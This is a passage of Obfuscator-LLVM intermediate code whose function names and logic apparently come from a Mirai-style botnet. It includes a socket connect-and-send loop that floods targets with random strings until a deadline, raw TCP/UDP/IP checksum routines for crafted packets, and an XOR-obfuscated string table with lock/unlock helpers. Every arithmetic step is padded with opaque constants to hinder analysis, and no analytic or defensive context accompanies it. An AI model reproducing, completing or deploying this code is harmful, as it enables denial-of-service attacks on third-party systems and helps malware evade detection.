  %178 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %179 = load %struct.sockaddr*, %struct.sockaddr** %178, align 8
  %180 = call i32 @connect(i32 %170, %struct.sockaddr* %179, i32 16)
  %181 = icmp eq i32 %180, -1
  br i1 %181, label %182, label %183

; <label>:182:                                    ; preds = %165
  br label %183

; <label>:183:                                    ; preds = %182, %165
  br label %184

; <label>:184:                                    ; preds = %183
  %185 = load i32, i32* %11, align 4
  %186 = sub i32 %185, 839743825
  %187 = add i32 %186, 1
  %188 = add i32 %187, 839743825
  %189 = add nsw i32 %185, 1
  store i32 %188, i32* %11, align 4
  br label %69

; <label>:190:                                    ; preds = %69
  br label %191

; <label>:191:                                    ; preds = %234, %190
  store i32 0, i32* %11, align 4
  br label %192

; <label>:192:                                    ; preds = %223, %191
  %193 = load i32, i32* %11, align 4
  %194 = load i8, i8* %7, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %193, %195
  br i1 %196, label %197, label %228

; <label>:197:                                    ; preds = %192
  %198 = load i8**, i8*** %12, align 8
  %199 = load i32, i32* %11, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i8*, i8** %198, i64 %200
  %202 = load i8*, i8** %201, align 8
  store i8* %202, i8** %25, align 8
  %203 = load i8, i8* %17, align 1
  %204 = icmp ne i8 %203, 0
  br i1 %204, label %205, label %213

; <label>:205:                                    ; preds = %197
  %206 = load i8*, i8** %25, align 8
  %207 = load i16, i16* %16, align 2
  %208 = zext i16 %207 to i32
  call void @rand_alpha_str(i8* %206, i32 %208)
  %209 = load i8*, i8** %25, align 8
  %210 = load i16, i16* %16, align 2
  %211 = zext i16 %210 to i64
  %212 = getelementptr inbounds i8, i8* %209, i64 %211
  store i8 0, i8* %212, align 1
  br label %213

; <label>:213:                                    ; preds = %205, %197
  %214 = load i32*, i32** %13, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i32, i32* %214, i64 %216
  %218 = load i32, i32* %217, align 4
  %219 = load i8*, i8** %25, align 8
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i64
  %222 = call i64 @send(i32 %218, i8* %219, i64 %221, i32 16384)
  br label %223

; <label>:223:                                    ; preds = %213
  %224 = load i32, i32* %11, align 4
  %225 = sub i32 0, 1
  %226 = sub i32 %224, %225
  %227 = add nsw i32 %224, 1
  store i32 %226, i32* %11, align 4
  br label %192

; <label>:228:                                    ; preds = %192
  %229 = call i64 @time(i64* null) #6
  %230 = load i32, i32* %19, align 4
  %231 = sext i32 %230 to i64
  %232 = icmp sgt i64 %229, %231
  br i1 %232, label %233, label %234

; <label>:233:                                    ; preds = %228
  br label %235

; <label>:234:                                    ; preds = %228
  br label %191

; <label>:235:                                    ; preds = %233, %108
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, -1602915433451805839
  %16 = add i64 %15, %13
  %17 = add i64 %16, -1602915433451805839
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = add i32 %20, -1755941959
  %22 = sub i32 %21, 2
  %23 = sub i32 %22, -1755941959
  %24 = sub i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %37

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = load i16, i16* %29, align 2
  %31 = trunc i16 %30 to i8
  %32 = sext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = sub i64 0, %32
  %35 = sub i64 %33, %34
  %36 = add i64 %33, %32
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %28, %25
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 65535, -1
  %42 = xor i64 %40, %41
  %43 = and i64 %42, %40
  %44 = and i64 %40, 65535
  %45 = sub i64 0, %39
  %46 = sub i64 0, %43
  %47 = add i64 %45, %46
  %48 = sub i64 0, %47
  %49 = add i64 %39, %43
  store i64 %48, i64* %5, align 8
  %50 = load i64, i64* %5, align 8
  %51 = lshr i64 %50, 16
  %52 = load i64, i64* %5, align 8
  %53 = sub i64 %52, -2176965495147444198
  %54 = add i64 %53, %51
  %55 = add i64 %54, -2176965495147444198
  %56 = add i64 %52, %51
  store i64 %55, i64* %5, align 8
  %57 = load i64, i64* %5, align 8
  %58 = xor i64 %57, -1
  %59 = and i64 -3256111780703757301, %58
  %60 = xor i64 -3256111780703757301, -1
  %61 = and i64 %57, %60
  %62 = xor i64 -1, -1
  %63 = and i64 %62, -3256111780703757301
  %64 = and i64 -1, %60
  %65 = or i64 %59, %61
  %66 = or i64 %63, %64
  %67 = xor i64 %65, %66
  %68 = xor i64 %57, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %41

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 %30, 860349146
  %32 = add i32 %31, %29
  %33 = add i32 %32, 860349146
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = sub i32 0, 2
  %39 = add i32 %37, %38
  %40 = sub nsw i32 %37, 2
  store i32 %39, i32* %8, align 4
  br label %23

; <label>:41:                                     ; preds = %23
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, 1
  br i1 %43, label %44, label %54

; <label>:44:                                     ; preds = %41
  %45 = load i16*, i16** %9, align 8
  %46 = bitcast i16* %45 to i8*
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = load i32, i32* %12, align 4
  %50 = add i32 %49, 55828519
  %51 = add i32 %50, %48
  %52 = sub i32 %51, 55828519
  %53 = add i32 %49, %48
  store i32 %52, i32* %12, align 4
  br label %54

; <label>:54:                                     ; preds = %44, %41
  %55 = load i32, i32* %10, align 4
  %56 = lshr i32 %55, 16
  %57 = xor i32 65535, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 65535
  %61 = load i32, i32* %12, align 4
  %62 = sub i32 %61, -1145100742
  %63 = add i32 %62, %59
  %64 = add i32 %63, -1145100742
  %65 = add i32 %61, %59
  store i32 %64, i32* %12, align 4
  %66 = load i32, i32* %10, align 4
  %67 = xor i32 65535, -1
  %68 = xor i32 %66, %67
  %69 = and i32 %68, %66
  %70 = and i32 %66, 65535
  %71 = load i32, i32* %12, align 4
  %72 = sub i32 0, %71
  %73 = sub i32 0, %69
  %74 = add i32 %72, %73
  %75 = sub i32 0, %74
  %76 = add i32 %71, %69
  store i32 %75, i32* %12, align 4
  %77 = load i32, i32* %11, align 4
  %78 = lshr i32 %77, 16
  %79 = xor i32 %78, -1
  %80 = xor i32 65535, -1
  %81 = xor i32 -991035163, -1
  %82 = or i32 %79, %80
  %83 = or i32 -991035163, %81
  %84 = xor i32 %82, -1
  %85 = and i32 %84, %83
  %86 = and i32 %78, 65535
  %87 = load i32, i32* %12, align 4
  %88 = sub i32 0, %85
  %89 = sub i32 %87, %88
  %90 = add i32 %87, %85
  store i32 %89, i32* %12, align 4
  %91 = load i32, i32* %11, align 4
  %92 = xor i32 65535, -1
  %93 = xor i32 %91, %92
  %94 = and i32 %93, %91
  %95 = and i32 %91, 65535
  %96 = load i32, i32* %12, align 4
  %97 = sub i32 %96, 1327786056
  %98 = add i32 %97, %94
  %99 = add i32 %98, 1327786056
  %100 = add i32 %96, %94
  store i32 %99, i32* %12, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 6
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i16
  %105 = call zeroext i16 @htons(i16 zeroext %104) #7
  %106 = zext i16 %105 to i32
  %107 = load i32, i32* %12, align 4
  %108 = add i32 %107, -2139131308
  %109 = add i32 %108, %106
  %110 = sub i32 %109, -2139131308
  %111 = add i32 %107, %106
  store i32 %110, i32* %12, align 4
  %112 = load i16, i16* %7, align 2
  %113 = zext i16 %112 to i32
  %114 = load i32, i32* %12, align 4
  %115 = sub i32 0, %113
  %116 = sub i32 %114, %115
  %117 = add i32 %114, %113
  store i32 %116, i32* %12, align 4
  br label %118

; <label>:118:                                    ; preds = %122, %54
  %119 = load i32, i32* %12, align 4
  %120 = lshr i32 %119, 16
  %121 = icmp ne i32 %120, 0
  br i1 %121, label %122, label %134

; <label>:122:                                    ; preds = %118
  %123 = load i32, i32* %12, align 4
  %124 = xor i32 65535, -1
  %125 = xor i32 %123, %124
  %126 = and i32 %125, %123
  %127 = and i32 %123, 65535
  %128 = load i32, i32* %12, align 4
  %129 = lshr i32 %128, 16
  %130 = add i32 %126, 1936042478
  %131 = add i32 %130, %129
  %132 = sub i32 %131, 1936042478
  %133 = add i32 %126, %129
  store i32 %132, i32* %12, align 4
  br label %118

; <label>:134:                                    ; preds = %118
  %135 = load i32, i32* %12, align 4
  %136 = xor i32 %135, -1
  %137 = and i32 -1, %136
  %138 = xor i32 -1, -1
  %139 = and i32 %135, %138
  %140 = or i32 %137, %139
  %141 = xor i32 %135, -1
  %142 = trunc i32 %140 to i16
  ret i16 %142
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 -1024193985, %15
  %17 = xor i32 -1024193985, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, -1024193985
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %31, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %31, %30
  store i32 %36, i32* @w, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @w, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 %38, %40
  %42 = xor i32 %38, -1
  %43 = and i32 %39, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %39, %38
  store i32 %44, i32* @w, align 4
  %46 = load i32, i32* @w, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [23 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 41)
  %6 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 41, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %15, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 0, -1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, -1
  store i32 %12, i32* %4, align 4
  %14 = icmp ne i32 %10, 0
  br i1 %14, label %15, label %25

; <label>:15:                                     ; preds = %9
  %16 = call i32 @rand_next()
  %17 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i32 0, i32 0
  %18 = call i32 @util_strlen(i8* %17)
  %19 = urem i32 %16, %18
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %3, align 8
  store i8 %22, i8* %23, align 1
  br label %9

; <label>:25:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 41)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 -1425602498, -1
  %16 = or i32 %13, %14
  %17 = or i32 -1425602498, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 255, -1
  %25 = xor i32 %23, %24
  %26 = and i32 %25, %23
  %27 = and i32 %23, 255
  %28 = trunc i32 %26 to i8
  store i8 %28, i8* %6, align 1
  %29 = load i32, i32* @table_key, align 4
  %30 = lshr i32 %29, 16
  %31 = xor i32 %30, -1
  %32 = xor i32 255, -1
  %33 = xor i32 -1122249052, -1
  %34 = or i32 %31, %32
  %35 = or i32 -1122249052, %33
  %36 = xor i32 %34, -1
  %37 = and i32 %36, %35
  %38 = and i32 %30, 255
  %39 = trunc i32 %37 to i8
  store i8 %39, i8* %7, align 1
  %40 = load i32, i32* @table_key, align 4
  %41 = lshr i32 %40, 24
  %42 = xor i32 %41, -1
  %43 = xor i32 255, -1
  %44 = xor i32 1279735304, -1
  %45 = or i32 %42, %43
  %46 = or i32 1279735304, %44
  %47 = xor i32 %45, -1
  %48 = and i32 %47, %46
  %49 = and i32 %41, 255
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %147, %1
  %52 = load i32, i32* %3, align 4
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i16, i16* %54, align 8
  %56 = zext i16 %55 to i32
  %57 = icmp slt i32 %52, %56
  br i1 %57, label %58, label %153

; <label>:58:                                     ; preds = %51
  %59 = load i8, i8* %5, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, -1
  %70 = and i32 1920350248, %69
  %71 = xor i32 1920350248, -1
  %72 = and i32 %68, %71
  %73 = xor i32 %60, -1
  %74 = and i32 %73, 1920350248
  %75 = and i32 %60, %71
  %76 = or i32 %70, %72
  %77 = or i32 %74, %75
  %78 = xor i32 %76, %77
  %79 = xor i32 %68, %60
  %80 = trunc i32 %78 to i8
  store i8 %80, i8* %66, align 1
  %81 = load i8, i8* %6, align 1
  %82 = zext i8 %81 to i32
  %83 = load %struct.table_value*, %struct.table_value** %4, align 8
  %84 = getelementptr inbounds %struct.table_value, %struct.table_value* %83, i32 0, i32 0
  %85 = load i8*, i8** %84, align 8
  %86 = load i32, i32* %3, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = xor i32 %90, -1
  %92 = and i32 -729847539, %91
  %93 = xor i32 -729847539, -1
  %94 = and i32 %90, %93
  %95 = xor i32 %82, -1
  %96 = and i32 %95, -729847539
  %97 = and i32 %82, %93
  %98 = or i32 %92, %94
  %99 = or i32 %96, %97
  %100 = xor i32 %98, %99
  %101 = xor i32 %90, %82
  %102 = trunc i32 %100 to i8
  store i8 %102, i8* %88, align 1
  %103 = load i8, i8* %7, align 1
  %104 = zext i8 %103 to i32
  %105 = load %struct.table_value*, %struct.table_value** %4, align 8
  %106 = getelementptr inbounds %struct.table_value, %struct.table_value* %105, i32 0, i32 0
  %107 = load i8*, i8** %106, align 8
  %108 = load i32, i32* %3, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %113 = xor i32 %112, -1
  %114 = and i32 1040046627, %113
  %115 = xor i32 1040046627, -1
  %116 = and i32 %112, %115
  %117 = xor i32 %104, -1
  %118 = and i32 %117, 1040046627
  %119 = and i32 %104, %115
  %120 = or i32 %114, %116
  %121 = or i32 %118, %119
  %122 = xor i32 %120, %121
  %123 = xor i32 %112, %104
  %124 = trunc i32 %122 to i8
  store i8 %124, i8* %110, align 1
  %125 = load i8, i8* %8, align 1
  %126 = zext i8 %125 to i32
  %127 = load %struct.table_value*, %struct.table_value** %4, align 8
  %128 = getelementptr inbounds %struct.table_value, %struct.table_value* %127, i32 0, i32 0
  %129 = load i8*, i8** %128, align 8
  %130 = load i32, i32* %3, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %129, i64 %131
  %133 = load i8, i8* %132, align 1
  %134 = sext i8 %133 to i32
  %135 = xor i32 %134, -1
  %136 = and i32 725769282, %135
  %137 = xor i32 725769282, -1
  %138 = and i32 %134, %137
  %139 = xor i32 %126, -1
  %140 = and i32 %139, 725769282
  %141 = and i32 %126, %137
  %142 = or i32 %136, %138
  %143 = or i32 %140, %141
  %144 = xor i32 %142, %143
  %145 = xor i32 %134, %126
  %146 = trunc i32 %144 to i8
  store i8 %146, i8* %132, align 1
  br label %147

; <label>:147:                                    ; preds = %58
  %148 = load i32, i32* %3, align 4
  %149 = sub i32 %148, -86795526
  %150 = add i32 %149, 1
  %151 = add i32 %150, -86795526
  %152 = add nsw i32 %148, 1
  store i32 %151, i32* %3, align 4
  br label %51

; <label>:153:                                    ; preds = %51
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
